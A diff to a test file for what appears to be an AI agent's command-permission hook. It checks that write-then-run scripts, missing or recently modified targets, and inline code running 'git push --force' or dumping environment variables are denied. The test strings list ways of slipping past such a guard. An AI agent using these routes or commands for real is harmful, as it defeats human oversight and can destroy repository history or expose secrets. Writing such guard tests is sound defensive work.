+            'mv new.py f.py; python f.py', 'cp new.py old_k.py && python old_k.py',
+            'cp new.py old.py && python old.py', "cat > h.py <<'EOF'\nprint(1)\nEOF\npython h.py",
+            "tee h2.py <<'EOF' >/dev/null\nprint(1)\nEOF\npython -I h2.py",
+            'cat new.py >> old_k.py; python -I old_k.py', 'echo 1 | tee t.py && python t.py',
+            'cp new.py sub && python sub/new.py', 'cp new.py sub/ && python -I sub/new.py',
+            'cp -t sub new.py && python sub/new.py', 'copy new.py c.py && python c.py',
+            'cp new.py w.sh; bash w.sh', 'cp old_k.py s.sh && zsh s.sh',
+            'pwsh -c "Copy-Item new.ps1 c.ps1" && pwsh -File c.ps1',
+            'pwsh -c "Move-Item new.ps1 -Destination m.ps1" && pwsh -File ./m.ps1',
+            'pwsh -c "Get-Content new.py | Out-File o.py" && python o.py',
+            'pwsh -c "Set-Content -Path s.py -Value 1" && python s.py',
+            'pwsh -c "Add-Content a.py 1" && python a.py',
+            '(cp new.py g.py) && python g.py', 'cp new.py n.js && node -r ./n.js old_k.py']
+        missing = ['python ghost.py', './ghost.sh', 'node ghost.js', 'bash sub/ghost.sh',
+                   'pwsh -File ghost.ps1', 'python -I sub/../ghost.py']
+        modified = ['python -I tun.py', 'python -I ren.py', 'python -I away.py',
+                    '(cd sub && python nn.py)', '{ cd sub; python nn.py; }', 'cd sub; python nn.py',
+                    '{ cd sub; }; python -I y.py', 'if true; then cd sub; fi; python -I y.py',
+                    'node lib/index', 'node lib', 'node ./lib/index']
+        kept = [('cp old_k.py backup.py && python -I old_k.py', None),   # a source is not written
+                ('bun run dev', None), ('deno task build', None),        # not a file path
+                ('node --test test/*.test.js', None), ('bin/tool --version', None),
+                ('python -I sub/x.py', None), ('cat old_k.py > copy.txt; python -I old_k.py', None),
+                ('(cd sub && python -I x.py)', None), ('(./sub/x.py )', None),
+                ('(cd sub && node --test t.js); python -I y.py', None),   # a subshell's cd
+                ('node scripts/build', None), ('node ./scripts/build', None),  # node resolves .js
+                ('(cd sub); python -I y.py', None), ('x=$(cd sub); python -I y.py', None),
+                ("bash -c 'cd sub'; python -I y.py", None),
+                ('(cd sub && (cd ..) && node --test t.js); python -I y.py', None),
+                (' ; '.join(['python -I old_k.py'] * 64), None)]
+        with session_at(start):
+            for cmd in written:
+                d = g.decide(cmd, t)
+                expect(f'written then run {cmd!r}: {d}', d and d[0] == 'deny'
+                       and 'written earlier in this same command' in d[1])
+            for cmd in missing:
+                d = g.decide(cmd, t)
+                expect(f'missing target {cmd!r}: {d}', d and d[0] == 'deny'
+                       and 'does not exist' in d[1])
+            for cmd in modified:
+                d = g.decide(cmd, t)
+                expect(f'recreated under an old name {cmd!r}: {d}', d and d[0] == 'deny'
+                       and 'was created or modified' in d[1])
+            for cmd, want in kept:
+                d = g.decide(cmd, t)
+                expect(f'kept {cmd[:60]!r}: {d}', (d[0] if d else None) == want)
+            d = g.decide(' ; '.join(['python -I old_k.py'] * 65), t)
+            expect(f'65 runs: over the cap {d}', d and d[0] == 'deny' and 'RUN_TARGET_CAP' in d[1])
+        d = g.decide('cp new.py fresh.py && python fresh.py', t)     # env unset: not judged
+        expect(f'env unset: {d}', d is None)
+    return n, fails
+
+
 def main():
+    os.environ.pop(g.SESSION_START_ENV, None)   # hermetic: rule 2 is set per check (S-B4)
     fails = 0
     n = 0
     for cmd, want in CASES:
@@ -2550,6 +2963,8 @@ def main():
             ('pwsh -NoProfile -File q.ps1', 'allow'), ('powershell -NoProfile -File w.ps1', None),
             ('pwsh -File crit.ps1', 'deny'), ('python evil.py', 'deny'),
             ('python tool.py', None), ('bash missing.sh', None),
+            ('zsh wipe.sh', 'deny'), ('dash push.sh', 'deny'), ('ksh probe.sh', 'deny'),
+            ('zsh hello.sh', None),
             ('echo start; bash hello.sh', 'allow'), ('bash hello.sh; npm install', None),
         ]
         for cmd, want in scripts:
@@ -3046,6 +3461,38 @@ def main():
     if denied != documented:
         fails += 1
         print(f'FAIL repo-script deny table: new {sorted(denied - documented)} gone {sorted(documented - denied)}')
+    # ledger S-B4: the same table with LIS_SESSION_START after every repo file (the repo's
+    # own scripts are never write-then-run), then rule 1 and rule 2 proper
+    denied2 = set()
+    with session_at(time.time() + 1):
+        for dp, dns, fns in os.walk(root):
+            dns[:] = [x for x in dns if x not in ('.git', 'node_modules', 'models', 'bin', 'logs',
+                                                    'results', '__pycache__', '.claude')]
+            for fn in fns:
+                ext = fn.rsplit('.', 1)[-1]
+                if ext in lead:
+                    rel = os.path.relpath(os.path.join(dp, fn), root).replace(os.sep, '/')
+                    d = g.decide(lead[ext] + rel, root)
+                    if d and d[0] == 'deny':
+                        denied2.add(rel)
+    n += 1
+    if denied2 != documented:
+        fails += 1
+        print(f'FAIL S-B4 repo-script table with the env set: {sorted(denied2 ^ documented)}')
+    for cmd in ('python -c "import os; print(os.environ)"',
+                'node -e "require(\'child_process\').execSync(\'git push --force\')"',
+                "bash -c 'git push --force; ls'"):
+        n += 1
+        d = g.decide(cmd)                   # the scan's deny keeps its own reason
+        if not (d and d[0] == 'deny' and 'inline code is not run' not in d[1]):
+            fails += 1
+            print(f'FAIL S-B4 scan reason kept: {cmd!r}: {d}')
+    k, f = sb4_write_run()
+    n += k
+    fails += f
+    k, f = sb4_fold2()
+    n += k
+    fails += f
     # ledger S-B3 audit C1: CRITICAL_PATH names the hook copies on its own, so a narrowed
     # any-mention rule still leaves a shell write to a copy critical
     n += 1
